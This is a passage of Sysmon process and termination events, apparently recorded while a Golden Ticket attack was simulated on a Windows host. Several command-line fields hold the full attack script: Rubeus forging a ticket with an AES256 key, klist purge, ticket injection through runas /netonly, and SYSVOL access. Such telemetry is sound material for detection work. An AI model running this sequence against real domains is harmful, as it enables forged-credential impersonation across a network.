current Windows session, # its output goes to golden.txt temp file, because we cannot capture \\\"\"runas /netonly\\\"\" output otherwise, @\\\"\", &gt;%TEMP%\\golden.txt 2&gt;&amp;1 (,   echo Purge existing tickets and create golden ticket:,   klist purge,   cd %temp%,   \\\"\"$Env:temp\\rubeus.exe\\\"\" ptt /ticket:kirbifile,   echo.,   echo Requesting SYSVOL:,   dir \\\\$($ENV:logonserver.TrimStart('\\') + \\\"\".\\\"\" + \\\"\"$ENV:userdnsdomain\\\"\")\\SYSVOL,   ,   echo.,   echo Tickets after requesting SYSVOL:,   klist,   echo.,   echo End of Golden Ticket attack, ), \\\"\"@ -Replace \\\"\"kirbifile\\\"\", $filename | Out-File -Encoding OEM $env:TEMP\\golden.bat, # run batch file in a new empty session (password and username do not matter), echo \\\"\"foo\\\"\" | runas /netonly /user:fake \\\"\"$env:TEMP\\golden.bat\\\"\" | Out-Null, # wait until the output file has logged the entire attack, do {,   Start-Sleep 1 # wait a bit so the output file has time to be created,   Get-Content -Path \\\"\"$env:TEMP\\golden.txt\\\"\" -Wait | ForEach-Object {,     if ($_ -match 'End of Golden Ticket attack') { break } ,   }, } while ($false) # dummy loop so that 'break' can be used, # show output from new empty session, Get-Content $env:TEMP\\golden.txt, # cleanup temp files, Remove-Item $env:TEMP\\golden.bat -ErrorAction Ignore, Remove-Item $env:TEMP\\golden.txt -ErrorAction Ignore}"},{"@Name":"ParentUser","#text":"SERVER002\\admin_test"}]}}}
{"Event":{"System":{"Provider":{"@Name":"Microsoft-Windows-Sysmon","@Guid":"5770385f-c22a-43e0-bf4c-06f5698ffbd9"},"EventID":"1","Version":"5","Level":"4","Task":"1","Opcode":"0","Keywords":"0x8000000000000000","TimeCreated":{"@SystemTime":"2024-10-27 22:45:25.5526889"},"EventRecordID":"18009","Correlation":null,"Execution":{"@ProcessID":"3192","@ThreadID":"3916"},"Channel":"Microsoft-Windows-Sysmon/Operational","Computer":"Server002","Security":{"@UserID":"S-1-5-18"}},"EventData":{"Data":[{"@Name":"RuleName","#text":"-"},{"@Name":"UtcTime","#text":"2024-10-27 22:45:25.540"},{"@Name":"ProcessGuid","#text":"dbf410b3-c285-671e-dc00-000000003900"},{"@Name":"ProcessId","#text":"1276"},{"@Name":"Image","#text":"C:\\Windows\\System32\\cmd.exe"},{"@Name":"FileVersion","#text":"10.0.19041.4355 (WinBuild.160101.0800)"},{"@Name":"Description","#text":"Windows Command Processor"},{"@Name":"Product","#text":"Microsoft® Windows® Operating System"},{"@Name":"Company","#text":"Microsoft Corporation"},{"@Name":"OriginalFileName","#text":"Cmd.Exe"},{"@Name":"CommandLine","#text":"\"C:\\Windows\\system32\\cmd.exe\" /c C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\rubeus.exe golden /aes256:b7268361386090314acce8d9367e55f55865e7ef8e670fbe4262d6c94098a9e9 /ldap /user:admin_test /dc: /printcmd /outfile:golden"},{"@Name":"CurrentDirectory","#text":"C:\\Users\\admin_test\\AppData\\Local\\Temp\\"},{"@Name":"User","#text":"SERVER002\\admin_test"},{"@Name":"LogonGuid","#text":"dbf410b3-c273-671e-598d-130000000000"},{"@Name":"LogonId","#text":"0x138D59"},{"@Name":"TerminalSessionId","#text":"0"},{"@Name":"IntegrityLevel","#text":"High"},{"@Name":"Hashes","#text":"SHA256=BADF4752413CB0CBDC03FB95820CA167F0CDC63B597CCDB5EF43111180E088B0"},{"@Name":"ParentProcessGuid","#text":"dbf410b3-c282-671e-da00-000000003900"},{"@Name":"ParentProcessId","#text":"6560"},{"@Name":"ParentImage","#text":"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"},{"@Name":"ParentCommandLine","#text":"\"powershell.exe\" &amp; {Remove-Item $env:TEMP\\golden.bat -ErrorAction Ignore, Remove-Item $env:TEMP\\golden.txt -ErrorAction Ignore, cmd.exe /c \\\"\"$Env:temp\\rubeus.exe\\\"\" golden /aes256:b7268361386090314acce8d9367e55f55865e7ef8e670fbe4262d6c94098a9e9 /ldap /user:$ENV:username /dc:$($ENV:logonserver.TrimStart('\\') + \\\"\".\\\"\" + \\\"\"$ENV:userdnsdomain\\\"\") /printcmd /outfile:golden, $filename = (Get-ChildItem | ? {$_.Name.startswith(\\\"\"golden_\\\"\")} | Sort-Object -Descending -Property LastWriteTime | select -First 1).Name, # create batch file with commands to run in a separate \\\"\"runas /netonly\\\"\" session, # so we don't purge Kerberos ticket from the current Windows session, # its output goes to golden.txt temp file, because we cannot capture \\\"\"runas /netonly\\\"\" output otherwise, @\\\"\", &gt;%TEMP%\\golden.txt 2&gt;&amp;1 (,   echo Purge existing tickets and create golden ticket:,   klist purge,   cd %temp%,   \\\"\"$Env:temp\\rubeus.exe\\\"\" ptt /ticket:kirbifile,   echo.,   echo Requesting SYSVOL:,   dir \\\\$($ENV:logonserver.TrimStart('\\') + \\\"\".\\\"\" + \\\"\"$ENV:userdnsdomain\\\"\")\\SYSVOL,   ,   echo.,   echo Tickets after requesting SYSVOL:,   klist,   echo.,   echo End of Golden Ticket attack, ), \\\"\"@ -Replace \\\"\"kirbifile\\\"\", $filename | Out-File -Encoding OEM $env:TEMP\\golden.bat, # run batch file in a new empty session (password and username do not matter), echo \\\"\"foo\\\"\" | runas /netonly /user:fake \\\"\"$env:TEMP\\golden.bat\\\"\" | Out-Null, # wait until the output file has logged the entire attack, do {,   Start-Sleep 1 # wait a bit so the output file has time to be created,   Get-Content -Path \\\"\"$env:TEMP\\golden.txt\\\"\" -Wait | ForEach-Object {,     if ($_ -match 'End of Golden Ticket attack') { break } ,   }, } while ($false) # dummy loop so that 'break' can be used, # show output from new empty session, Get-Content $env:TEMP\\golden.txt, # cleanup temp files, Remove-Item $env:TEMP\\golden.bat -ErrorAction Ignore, Remove-Item $env:TEMP\\golden.txt -ErrorAction Ignore}"},{"@Name":"ParentUser","#text":"SERVER002\\admin_test"}]}}}
{"Event":{"System":{"Provider":{"@Name":"Microsoft-Windows-Sysmon","@Guid":"5770385f-c22a-43e0-bf4c-06f5698ffbd9"},"EventID":"5","Version":"3","Level":"4","Task":"5","Opcode":"0","Keywords":"0x8000000000000000","TimeCreated":{"@SystemTime":"2024-10-27 22:45:25.6366624"},"EventRecordID":"18010","Correlation":null,"Execution":{"@ProcessID":"3192","@ThreadID":"3916"},"Channel":"Microsoft-Windows-Sysmon/Operational","Computer":"Server002","Security":{"@UserID":"S-1-5-18"}},"EventData":{"Data":[{"@Name":"RuleName","#text":"-"},{"@Name":"UtcTime","#text":"2024-10-27 22:45:25.618"},{"@Name":"ProcessGuid","#text":"dbf410b3-c285-671e-dc00-000000003900"},{"@Name":"ProcessId","#text":"1276"},{"@Name":"Image","#text":"C:\\Windows\\System32\\cmd.exe"},{"@Name":"User","#text":"SERVER002\\admin_test"}]}}}
{"Event":{"System":{"Provider":{"@Name":"Microsoft-Windows-Sysmon","@Guid":"5770385f-c22a-43e0-bf4c-06f5698ffbd9"},"EventID":"1","Version":"5","Level":"4","Task":"1","Opcode":"0","Keywords":"0x8000000000000000","TimeCreated":{"@SystemTime":"2024-10-27 22:45:25.9253798"},"EventRecordID":"18011","Correlation":null,"Execution":{"@ProcessID":"3192","@ThreadID":"3916"},"Channel":"Microsoft-Windows-Sysmon/Operational","Computer":"Server002","Security":{"@UserID":"S-1-5-18"}},"EventData":{"Data":[{"@Name":"RuleName","#text":"-"},{"@Name":"UtcTime","#text":"2024-10-27 22:45:25.920"},{"@Name":"ProcessGuid","#text":"dbf410b3-c285-671e-dd00-000000003900"},{"@Name":"ProcessId","#text":"6884"},{"@Name":"Image","#text":"C:\\Windows\\System32\\runas.exe"},{"@Name":"FileVersion","#text":"10.0.19041.3636 (WinBuild.160101.0800)"},{"@Name":"Description","#text":"Run As Utility"},{"@Name":"Product","#text":"Microsoft® Windows® Operating System"},{"@Name":"Company","#text":"Microsoft Corporation"},{"@Name":"OriginalFileName","#text":"RUNAS.EXE"},{"@Name":"CommandLine","#text":"\"C:\\Windows\\system32\\runas.exe\" /netonly /user:fake C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\golden.bat"},{"@Name":"CurrentDirectory","#text":"C:\\Users\\admin_test\\AppData\\Local\\Temp\\"},{"@Name":"User","#text":"SERVER002\\admin_test"},{"@Name":"LogonGuid","#text":"dbf410b3-c273-671e-598d-130000000000"},{"@Name":"LogonId","#text":"0x138D59"},{"@Name":"TerminalSessionId","#text":"0"},{"@Name":"IntegrityLevel","#text":"High"},{"@Name":"Hashes","#text":"SHA256=0867CC5937AB24D4CB334C1EF66A43D061923C856C64E585B15C3C9833ECBA0E"},{"@Name":"ParentProcessGuid","#text":"dbf410b3-c282-671e-da00-000000003900"},{"@Name":"ParentProcessId","#text":"6560"},{"@Name":"ParentImage","#text":"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"},{"@Name":"ParentCommandLine","#text":"\"powershell.exe\" &amp; {Remove-Item $env:TEMP\\golden.bat -ErrorAction Ignore, Remove-Item $env:TEMP\\golden.txt -ErrorAction Ignore, cmd.exe /c \\\"\"$Env:temp\\rubeus.exe\\\"\" golden /aes256:b7268361386090314acce8d9367e55f55865e7ef8e670fbe4262d6c94098a9e9 /ldap /user:$ENV:username /dc:$($ENV:logonserver.TrimStart('\\') + \\\"\".\\\"\" + \\\"\"$ENV:userdnsdomain\\\"\") /printcmd /outfile:golden, $filename = (Get-ChildItem | ? {$_.Name.startswith(\\\"\"golden_\\\"\")} | Sort-Object -Descending -Property LastWriteTime | select -First 1).Name, # create batch file with commands to run in a separate \\\"\"runas /netonly\\\"\" session, # so we don't purge Kerberos ticket from the current Windows session, # its output goes to golden.txt temp file, because we cannot capture \\\"\"runas /netonly\\\"\" output otherwise, @\\\"\", &gt;%TEMP%\\golden.txt 2&gt;&amp;1 (,   echo Purge existing tickets and create golden ticket:,   klist purge,   cd %temp%,   \\\"\"$Env:temp\\rubeus.exe\\\"\" ptt /ticket:kirbifile,   echo.,   echo Requesting SYSVOL:,   dir \\\\$($ENV:logonserver.TrimStart('\\') + \\\"\".\\\"\" + \\\"\"$ENV:userdnsdomain\\\"\")\\SYSVOL,   ,   echo.,   echo Tickets after requesting SYSVOL:,   klist,   echo.,   echo End of Golden Ticket attack, ), \\\"\"@ -Replace \\\"\"kirbifile\\\"\", $filename | Out-File -Encoding OEM $env:TEMP\\golden.bat, # run batch file in a new empty session (password and username do not matter), echo \\\"\"foo\\\"\" | runas /netonly /user:fake \\\"\"$env:TEMP\\golden.bat\\\"\" | Out-Null, # wait until the output file has logged the entire attack, do {,   Start-Sleep 1 # wait a bit so the output file has time to be created,   Get-Content -Path \\\"\"$env:TEMP\\golden.txt\\\"\" -Wait | ForEach-Object {,     if ($_ -match 'End of Golden Ticket attack') { break } ,   }, } while ($false) # dummy loop so that 'break' can be used, # show output from new empty session, Get-Content $env:TEMP\\golden.txt, # cleanup temp files, Remove-Item $env:TEMP\\golden.bat -ErrorAction Ignore, Remove-Item $env:TEMP\\golden.txt -ErrorAction Ignore}"},{"@Name":"ParentUser","#text":"SERVER002\\admin_test"}]}}}
{"Event":{"System":{"Provider":{"@Name":"Microsoft-Windows-Sysmon","@Guid":"5770385f-c22a-43e0-bf4c-06f5698ffbd9"},"EventID":"1","Version":"5","Level":"4","Task":"1","Opcode":"0","Keywords":"0x8000000000000000","TimeCreated":{"@SystemTime":"2024-10-27 22:45:26.0664560"},"EventRecordID":"18012","Correlation":null,"Execution":{"@ProcessID":"3192","@ThreadID":"3916"},"Channel":"Microsoft-Windows-Sysmon/Operational","Computer":"Server002","Security":{"@UserID":"S-1-5-18"}},"EventData":{"Data":[{"@Name":"RuleName","#text":"-"},{"@Name":"UtcTime","#text":"2024-10-27 22:45:26.062"},{"@Name":"ProcessGuid","#text":"dbf410b3-c286-671e-de00-000000003900"},{"@Name":"ProcessId","#text":"6328"},{"@Name":"Image","#text":"C:\\Windows\\System32\\svchost.exe"},{"@Name":"FileVersion","#text":"10.0.19041.4355 (WinBuild.160101.0800)"},{"@Name":"Description","#text":"Host Process for Windows Services"},{"@Name":"Product","#text":"Microsoft® Windows® Operating System"},{"@Name":"Company","#text":"Microsoft Corporation"},{"@Name":"OriginalFileName","#text":"svchost.exe"},{"@Name":"CommandLine","#text":"C:\\Windows\\system32\\svchost.exe -k netsvcs -p -s seclogon"},{"@Name":"CurrentDirectory","#text":"C:\\Windows\\system32\\"},{"@Name":"User","#text":"NT AUTHORITY\\SYSTEM"},{"@Name":"LogonGuid","#text":"dbf410b3-cffc-671e-e703-000000000000"},{"@Name":"LogonId","#text":"0x3E7"},{"@Name":"TerminalSessionId","#text":"0"},{"@Name":"IntegrityLevel","#text":"System"},{"@Name":"Hashes","#text":"SHA256=6FC3BF1FDFD76860BE782554F8D25BD32F108DB934D70F4253F1E5F23522E503"},{"@Name":"ParentProcessGuid","#text":"00000000-0000-0000-0000-000000000000"},{"@Name":"ParentProcessId","#text":"664"},{"@Name":"ParentImage","#text":"-"},{"@Name":"ParentCommandLine","#text":"-"},{"@Name":"ParentUser","#text":"-"}]}}}
{"Event":{"System":{"Provider":{"@Name":"Microsoft-Windows-Sysmon","@Guid":"5770385f-c22a-43e0-bf4c-06f5698ffbd9"},"EventID":"1","Version":"5","Level":"4","Task":"1","Opcode":"0","Keywords":"0x8000000000000000","TimeCreated":{"@SystemTime":"2024-10-27 22:45:26.3511398"},"EventRecordID":"18013","Correlation":null,"Execution":{"@ProcessID":"3192","@ThreadID":"3916"},"Channel":"Microsoft-Windows-Sysmon/Operational","Computer":"Server002","Security":{"@UserID":"S-1-5-18"}},"EventData":{"Data":[{"@Name":"RuleName","#text":"-"},{"@Name":"UtcTime","#text":"2024-10-27 22:45:26.344"},{"@Name":"ProcessGuid","#text":"dbf410b3-c286-671e-df00-000000003900"},{"@Name":"ProcessId","#text":"2364"},{"@Name":"Image","#text":"C:\\Windows\\System32\\cmd.exe"},{"@Name":"FileVersion","#text":"10.0.19041.4355 (WinBuild.160101.0800)"},{"@Name":"Description","#text":"Windows Command Processor"},{"@Name":"Product","#text":"Microsoft® Windows® Operating System"},{"@Name":"Company","#text":"Microsoft Corporation"},{"@Name":"OriginalFileName","#text":"Cmd.Exe"},{"@Name":"CommandLine","#text":"C:\\Windows\\system32\\cmd.exe /c C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\golden.bat"},{"@Name":"CurrentDirectory","#text":"C:\\Windows\\system32\\"},{"@Name":"User","#text":"SERVER002\\admin_test"},{"@Name":"LogonGuid","#text":"dbf410b3-c286-671e-e34b-150000000000"},{"@Name":"LogonId","#text":"0x154BE3"},{"@Name":"TerminalSessionId","#text":"0"},{"@Name":"IntegrityLevel","#text":"High"},{"@Name":"Hashes","#text":"SHA256=BADF4752413CB0CBDC03FB95820CA167F0CDC63B597CCDB5EF43111180E088B0"},{"@Name":"ParentProcessGuid","#text":"dbf410b3-c285-671e-dd00-000000003900"},{"@Name":"ParentProcessId","#text":"6884"},{"@Name":"ParentImage","#text":"C:\\Windows\\System32\\runas.exe"},{"@Name":"ParentCommandLine","#text":"\"C:\\Windows\\system32\\runas.exe\" /netonly /user:fake C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\golden.bat"},{"@Name":"ParentUser","#text":"SERVER002\\admin_test"}]}}}
{"Event":{"System":{"Provider":{"@Name":"Microsoft-Windows-Sysmon","@Guid":"5770385f-c22a-43e0-bf4c-06f5698ffbd9"},"EventID":"5","Version":"3","Level":"4","Task":"5","Opcode":"0","Keywords":"0x8000000000000000","TimeCreated":{"@SystemTime":"2024-10-27 22:45:26.3572690"},"EventRecordID":"18014","Correlation":null,"Execution":{"@ProcessID":"3192","@ThreadID":"3916"},"Channel":"Microsoft-Windows-Sysmon/Operational","Computer":"Server002","Security":{"@UserID":"S-1-5-18"}},"EventData":{"Data":[{"@Name":"RuleName","#text":"-"},{"@Name":"UtcTime","#text":"2024-10-27 22:45:26.336"},{"@Name":"ProcessGuid","#text":"dbf410b3-c285-671e-dd00-000000003900"},{"@Name":"ProcessId","#text":"6884"},{"@Name":"Image","#text":"C:\\Windows\\System32\\runas.exe"},{"@Name":"User","#text":"SERVER002\\admin_test"}]}}}
{"Event":{"System":{"Provider":{"@Name":"Microsoft-Windows-Sysmon","@Guid":"5770385f-c22a-43e0-bf4c-06f5698ffbd9"},"EventID":"1","Version":"5","Level":"4","Task":"1","Opcode":"0","Keywords":"0x8000000000000000","TimeCreated":{"@SystemTime":"2024-10-27 22:45:26.3592150"},"EventRecordID":"18015","Correlation":null,"Execution":{"@ProcessID":"3192","@ThreadID":"3916"},"Channel":"Microsoft-Windows-Sysmon/Operational","Computer":"Server002","Security":{"@UserID":"S-1-5-18"}},"EventData":{"Data":[{"@Name":"RuleName","#text":"-"},{"@Name":"UtcTime","#text":"2024-10-27 22:45:26.356"},{"@Name":"ProcessGuid","#text":"dbf410b3-c286-671e-e000-000000003900"},{"@Name":"ProcessId","#text":"1716"},{"@Name":"Image","#text":"C:\\Windows\\System32\\conhost.exe"},{"@Name":"FileVersion","#text":"10.0.19041.4355 (WinBuild.160101.0800)"},{"@Name":"Description","#text":"Console Window Host"},{"@Name":"Product","#text":"Microsoft® Windows® Operating System"},{"@Name":"Company","#text":"Microsoft Corporation"},{"@Name":"OriginalFileName","#text":"CONHOST.EXE"},{"@Name":"CommandLine","#text":"\\??\\C:\\Windows\\system32\\conhost.exe 0xffffffff -ForceV1"},{"@Name":"CurrentDirectory","#text":"C:\\Windows"},{"@Name":"User","#text":"SERVER002\\admin_test"},{"@Name":"LogonGuid","#text":"dbf410b3-c286-671e-e34b-150000000000"},{"@Name":"LogonId","#text":"0x154BE3"},{"@Name":"TerminalSessionId","#text":"0"},{"@Name":"IntegrityLevel","#text":"High"},{"@Name":"Hashes","#text":"SHA256=CC0A60CD15FA21E54615E46CD0F10CFBE86F496DC64D14B31D9F3B415D120EE1"},{"@Name":"ParentProcessGuid","#text":"dbf410b3-c286-671e-df00-000000003900"},{"@Name":"ParentProcessId","#text":"2364"},{"@Name":"ParentImage","#text":"C:\\Windows\\System32\\cmd.exe"},{"@Name":"ParentCommandLine","#text":"C:\\Windows\\system32\\cmd.exe /c C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\golden.bat"},{"@Name":"ParentUser","#text":"SERVER002\\admin_test"}]}}}
{"Event":{"System":{"Provider":{"@Name":"Microsoft-Windows-Sysmon","@Guid":"5770385f-c22a-43e0-bf4c-06f5698ffbd9"},"EventID":"1","Version":"5","Level":"4","Task":"1","Opcode":"0","Keywords":"0x8000000000000000","TimeCreated":{"@SystemTime":"2024-10-27 22:45:26.4764195"},"EventRecordID":"18016","Correlation":null,"Execution":{"@ProcessID":"3192","@ThreadID":"3916"},"Channel":"Microsoft-Windows-Sysmon/Operational","Computer":"Server002","Security":{"@UserID":"S-1-5-18"}},"EventData":{"Data":[{"@Name":"RuleName","#text":"-"},{"@Name":"UtcTime","#text":"2024-10-27 22:45:26.471"},{"@Name":"ProcessGuid","#text":"dbf410b3-c286-671e-e100-000000003900"},{"@Name":"ProcessId","#text":"848"},{"@Name":"Image","#text":"C:\\Windows\\System32\\klist.exe"},{"@Name":"FileVersion","#text":"10.0.19041.4355 (WinBuild.160101.0800)"},{"@Name":"Description","#text":"Tool for managing the Kerberos ticket cache"},{"@Name":"Product","#text":"Microsoft® Windows® Operating System"},{"@Name":"Company","#text":"Microsoft Corporation"},{"@Name":"OriginalFileName","#text":"klist.exe"},{"@Name":"CommandLine","#text":"klist  purge"},{"@Name":"CurrentDirectory","#text":"C:\\Windows\\system32\\"},{"@Name":"User","#text":"SERVER002\\admin_test"},{"@Name":"LogonGuid","#text":"dbf410b3-c286-671e-e34b-150000000000"},{"@Name":"LogonId","#text":"0x154BE3"},{"@Name":"TerminalSessionId","#text":"0"},{"@Name":"IntegrityLevel","#text":"High"},{"@Name":"Hashes","#text":"SHA256=9E9FFD30B491F98D246BB4A4FA83F656BF2AFD2E5AE30CE6FBDE79E5B6521F6D"},{"@Name":"ParentProcessGuid","#text":"dbf410b3-c286-671e-df00-000000003900"},{"@Name":"ParentProcessId","#text":"2364"},{"@Name":"ParentImage","#text":"C:\\Windows\\System32\\cmd.exe"},{"@Name":"ParentCommandLine","#text":"C:\\Windows\\system32\\cmd.exe /c C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\golden.bat"},{"@Name":"ParentUser","#text":"SERVER002\\admin_test"}]}}}
{"Event":{"System":{"Provider":{"@Name":"Microsoft-Windows-Sysmon","@Guid":"5770385f-c22a-43e0-bf4c-06f5698ffbd9"},"EventID":"5","Version":"3","Level":"4","Task":"5","Opcode":"0","Keywords":"0x8000000000000000","TimeCreated":{"@SystemTime":"2024-10-27 22:45:26.5039531"},"EventRecordID":"18017","Correlation":null,"Execution":{"@ProcessID":"3192","@ThreadID":"3916"},"Channel":"Microsoft-Windows-Sysmon/Operational","Computer":"Server002","Security":{"@UserID":"S-1-5-18"}},"EventData":{"Data":[{"@Name":"RuleName","#text":"-"},{"@Name":"UtcTime","#text":"2024-10-27 22:45:26.488"},{"@Name":"ProcessGuid","#text":"dbf410b3-c286-671e-e100-000000003900"},{"@Name":"ProcessId","#text":"848"},{"@Name":"Image","#text":"C:\\Windows\\System32\\klist.exe"},{"@Name":"User","#text":"SERVER002\\admin_test"}]}}}
{"Event":{"System":{"Provider":{"@Name":"Microsoft-Windows-Sysmon","@Guid":"5770385f-c22a-43e0-bf4c-06f5698ffbd9"},"EventID":"1","Version":"5","Level":"4","Task":"1","Opcode":"0","Keywords":"0x8000000000000000","TimeCreated":{"@SystemTime":"2024-10-27 22:45:26.5145525"},"EventRecordID":"18018","Correlation":null,"Execution":{"@ProcessID":"3192","@ThreadID":"3916"},"Channel":"Microsoft-Windows-Sysmon/Operational","Computer":"Server002","Security":{"@UserID":"S-1-5-18"}},"EventData":{"Data":[{"@Name":"RuleName","#text":"-"},{"@Name":"UtcTime","#text":"2024-10-27 22:45:26.511"},{"@Name":"ProcessGuid","#text":"dbf410b3-c286-671e-e200-000000003900"},{"@Name":"ProcessId","#text":"6164"},{"@Name":"Image","#text":"C:\\Windows\\System32\\klist.exe"},{"@Name":"FileVersion","#text":"10.0.19041.4355 (WinBuild.160101.0800)"},{"@Name":"Description","#text":"Tool for managing the Kerberos ticket cache"},{"@Name":"Product","#text":"Microsoft® Windows® Operating System"},{"@Name":"Company","#text":"Microsoft Corporation"},{"@Name":"OriginalFileName","#text":"klist.exe"},{"@Name":"CommandLine","#text":"klist"},{"@Name":"CurrentDirectory","#text":"C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\"},{"@Name":"User","#text":"SERVER002\\admin_test"},{"@Name":"LogonGuid","#text":"dbf410b3-c286-671e-e34b-150000000000"},{"@Name":"LogonId","#text":"0x154BE3"},{"@Name":"TerminalSessionId","#text":"0"},{"@Name":"IntegrityLevel","#text":"High"},{"@Name":"Hashes","#text":"SHA256=9E9FFD30B491F98D246BB4A4FA83F656BF2AFD2E5AE30CE6FBDE79E5B6521F6D"},{"@Name":"ParentProcessGuid","#text":"dbf410b3-c286-671e-df00-000000003900"},{"@Name":"ParentProcessId","#text":"2364"},{"@Name":"ParentImage","#text":"C:\\Windows\\System32\\cmd.exe"},{"@Name":"ParentCommandLine","#text":"C:\\Windows\\system32\\cmd.exe /c C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\golden.bat"},{"@Name":"ParentUser","#text":"SERVER002\\admin_test"}]}}}
{"Event":{"System":{"Provider":{"@Name":"Microsoft-Windows-Sysmon","@Guid":"5770385f-c22a-43e0-bf4c-06f5698ffbd9"},"EventID":"5","Version":"3","Level":"4","Task":"5","Opcode":"0","Keywords":"0x8000000000000000","TimeCreated":{"@SystemTime":"2024-10-27 22:45:26.5370663"},"EventRecordID":"18019","Correlation":null,"Execution":{"@ProcessID":"3192","@ThreadID":"3916"},"Channel":"Microsoft-Windows-Sysmon/Operational","Computer":"Server002","Security":{"@UserID":"S-1-5-18"}},"EventData":{"Data":[{"@Name":"RuleName","#text":"-"},{"@Name":"UtcTime","#text":"2024-10-27 22:45:26.523"},{"@Name":"ProcessGuid","#text":"dbf410b3-c286-671e-e200-000000003900"},{"@Name":"ProcessId","#text":"6164"},{"@Name":"Image","#text":"C:\\Windows\\System32\\klist.exe"},{"@Name":"User","#text":"SERVER002\\admin_test"}]}}}
